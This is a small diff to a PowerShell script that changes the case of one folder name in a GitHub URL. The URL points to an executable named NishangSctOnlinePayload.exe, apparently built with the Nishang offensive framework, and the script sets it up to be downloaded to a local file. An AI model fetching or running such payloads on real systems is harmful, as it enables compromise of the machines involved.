@@ -1,4 +1,4 @@
-$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/Nishang/NishangSctOnlinePayload.exe'
+$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/nishang/NishangSctOnlinePayload.exe'
 $output = "NishangSctOnlinePayloaded.exe"
 $start_time = Get-Date
 
